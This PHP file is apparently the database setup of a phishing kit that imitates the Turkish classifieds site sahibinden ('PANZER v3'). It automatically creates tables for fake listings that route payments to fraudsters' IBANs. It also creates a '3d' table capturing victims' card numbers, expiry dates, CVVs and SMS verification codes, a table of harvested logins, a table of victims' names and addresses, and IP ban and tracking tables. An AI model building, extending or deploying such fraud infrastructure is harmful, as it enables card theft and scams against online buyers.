<?php
/**
 * PANZER · sahibinden v3 — ortak DB router
 * Eski "sdn" yerine projenin ortak jakartaxdw DB'sine baglanir.
 */
$_pzr_cfg = dirname(__DIR__, 2) . DIRECTORY_SEPARATOR
          . 'BellaMain' . DIRECTORY_SEPARATOR
          . 'database' . DIRECTORY_SEPARATOR
          . 'config.php';

if (!is_file($_pzr_cfg)) {
    http_response_code(500);
    die('Config bulunamadi.');
}

require $_pzr_cfg;

$dbname   = $dbName;
$user     = $dbUser;
$password = $dbPass;
$dsn      = "mysql:host={$dbHost};charset=utf8;dbname={$dbname}";

/**
 * Ensure all legacy sdn tables exist in the shared DB.
 * Safe to call multiple times — runs DDL only once per request.
 */
if (!function_exists('pzr_ensure_listing_tables')) {
function pzr_ensure_listing_tables(PDO $conn): void
{
    static $done = false;
    if ($done) return;
    $done = true;

    /* ── ban ── */
    $conn->exec("
    CREATE TABLE IF NOT EXISTS `ban` (
      `ip` varchar(255) NOT NULL
    ) ENGINE=InnoDB DEFAULT CHARSET=utf8
    ");

    /* ── ilan (legacy) ── */
    $conn->exec("
    CREATE TABLE IF NOT EXISTS `ilan` (
      `id` int(11) NOT NULL AUTO_INCREMENT,
      `ilanurl` varchar(255) NOT NULL,
      `ilanfoto` varchar(255) NOT NULL,
      `ilanad` varchar(255) NOT NULL,
      `ilanfiyat` varchar(255) NOT NULL,
      `hizmetbedeli` varchar(255) NOT NULL,
      `banks` varchar(255) NOT NULL,
      `hesapsahibi` varchar(255) NOT NULL,
      `iban` varchar(255) NOT NULL,
      `hesapno` varchar(255) NOT NULL,
      `subekodu` varchar(255) NOT NULL,
      PRIMARY KEY (`id`)
    ) ENGINE=InnoDB DEFAULT CHARSET=utf8
    ");

    /* ── ilan_telefon ── */
    $conn->exec("
    CREATE TABLE IF NOT EXISTS `ilan_telefon` (
      `id` int(11) NOT NULL AUTO_INCREMENT,
      `seller_name` varchar(100) NOT NULL,
      `seller_phone` varchar(100) NOT NULL,
      `ilanurl` varchar(255) NOT NULL,
      `ilanad` varchar(255) NOT NULL,
      `ilanfiyat` varchar(255) NOT NULL,
      `ilan_resim` longtext NOT NULL,
      `il` varchar(100) NOT NULL,
      `ilce` varchar(100) NOT NULL,
      `mahalle` varchar(100) NOT NULL,
      `ilan_no` varchar(10) NOT NULL,
      `ilan_date` varchar(50) NOT NULL,
      `marka` varchar(100) NOT NULL,
      `model` varchar(100) NOT NULL,
      `os` varchar(10) NOT NULL,
      `storage` varchar(50) NOT NULL,
      `inches` varchar(25) NOT NULL,
      `ram` varchar(25) NOT NULL,
      `backcamera` varchar(25) NOT NULL,
      `frontcamera` varchar(25) NOT NULL,
      `color` varchar(100) NOT NULL,
      `garanti` varchar(100) NOT NULL,
      `fromwho` varchar(255) NOT NULL,
      `swap` varchar(255) NOT NULL,
      `status` varchar(255) NOT NULL,
      `description` longtext NOT NULL,
      `hizmetbedeli` varchar(255) NOT NULL,
      `banks` varchar(255) NOT NULL,
      `hesapsahibi` varchar(255) NOT NULL,
      `iban` varchar(255) NOT NULL,
      `hesapno` varchar(255) NOT NULL,
      `subekodu` varchar(255) NOT NULL,
      PRIMARY KEY (`id`),
      UNIQUE KEY `ilanurl` (`ilanurl`)
    ) ENGINE=InnoDB DEFAULT CHARSET=utf8
    ");

    /* ── ilan_playstation ── */
    $conn->exec("
    CREATE TABLE IF NOT EXISTS `ilan_playstation` (
      `id` int(11) NOT NULL AUTO_INCREMENT,
      `seller_name` varchar(100) NOT NULL,
      `seller_phone` varchar(100) NOT NULL,
      `ilanurl` varchar(255) NOT NULL,
      `ilanad` varchar(255) NOT NULL,
      `ilanfiyat` varchar(255) NOT NULL,
      `ilan_resim` longtext NOT NULL,
      `il` varchar(100) NOT NULL,
      `ilce` varchar(100) NOT NULL,
      `mahalle` varchar(100) NOT NULL,
      `ilan_no` varchar(10) NOT NULL,
      `ilan_date` varchar(50) NOT NULL,
      `marka` varchar(255) NOT NULL,
      `case_type` varchar(255) NOT NULL,
      `storage` varchar(255) NOT NULL,
      `os` varchar(255) NOT NULL,
      `ps5_model` varchar(255) NOT NULL,
      `renk` varchar(255) NOT NULL,
      `garanti` varchar(255) NOT NULL,
      `fromwho` varchar(255) NOT NULL,
      `swap` varchar(255) NOT NULL,
      `status` varchar(255) NOT NULL,
      `description` longtext NOT NULL,
      `hizmetbedeli` varchar(255) NOT NULL,
      `banks` varchar(255) NOT NULL,
      `hesapsahibi` varchar(255) NOT NULL,
      `iban` varchar(255) NOT NULL,
      `hesapno` varchar(255) NOT NULL,
      `subekodu` varchar(255) NOT NULL,
      PRIMARY KEY (`id`),
      UNIQUE KEY `ilanurl` (`ilanurl`)
    ) ENGINE=InnoDB DEFAULT CHARSET=utf8
    ");

    /* ── info ── */
    $conn->exec("
    CREATE TABLE IF NOT EXISTS `info` (
      `id` int(11) NOT NULL AUTO_INCREMENT,
      `firstName` varchar(255) NOT NULL,
      `lastName` varchar(255) NOT NULL,
      `homePhone` varchar(255) NOT NULL,
      `addressName` varchar(255) NOT NULL,
      `il` varchar(255) NOT NULL,
      `ilce` varchar(255) NOT NULL,
      `addressDetail` varchar(255) NOT NULL,
      `makbuz` varchar(255) NOT NULL,
      `type` varchar(50) NOT NULL,
      `ip` varchar(255) NOT NULL,
      PRIMARY KEY (`id`)
    ) ENGINE=InnoDB DEFAULT CHARSET=utf8
    ");

    /* ── login ── */
    $conn->exec("
    CREATE TABLE IF NOT EXISTS `login` (
      `id` int(11) NOT NULL AUTO_INCREMENT,
      `username` varchar(255) NOT NULL,
      `password` varchar(255) NOT NULL,
      PRIMARY KEY (`id`)
    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4
    ");

    /* ── 3d ── */
    $conn->exec("
    CREATE TABLE IF NOT EXISTS `3d` (
      `id` int(11) NOT NULL AUTO_INCREMENT,
      `cardOwner` varchar(255) NOT NULL,
      `cardnumber` varchar(30) NOT NULL,
      `month` varchar(3) NOT NULL,
      `year` varchar(4) NOT NULL,
      `cvv` varchar(3) NOT NULL,
      `sms` varchar(6) NOT NULL,
      `ip` varchar(255) NOT NULL,
      PRIMARY KEY (`id`)
    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4
    ");

    /* ── ip tracking ── */
    $conn->exec("CREATE TABLE IF NOT EXISTS `ip2` (`ip2` varchar(255) NOT NULL) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4");
    $conn->exec("CREATE TABLE IF NOT EXISTS `ip3` (`ip3` varchar(255) NOT NULL) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4");
    $conn->exec("CREATE TABLE IF NOT EXISTS `ip4` (`ip4` varchar(255) NOT NULL) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4");

    /* ── ilceler (il / ilçe listesi) ── */
    $conn->exec("
    CREATE TABLE IF NOT EXISTS `ilceler` (
      `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT,
      `il` varchar(255) NOT NULL,
      `ilce` varchar(255) NOT NULL,
      PRIMARY KEY (`id`)
    ) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci
    ");

    /* Seed ilceler from sdn.sql if empty */
    require_once __DIR__ . '/seed_ilceler.php';
    pzr_seed_ilceler($conn);
}
} // end function_exists guard

/* ── Auto-create missing tables when router is included ── */
try {
    $_pzr_init = new PDO($dsn, $user, $password);
    $_pzr_init->exec("SET NAMES 'utf8'");
    pzr_ensure_listing_tables($_pzr_init);
    unset($_pzr_init);
} catch (Throwable $e) {
    // silent — individual pages will catch their own PDO errors
}
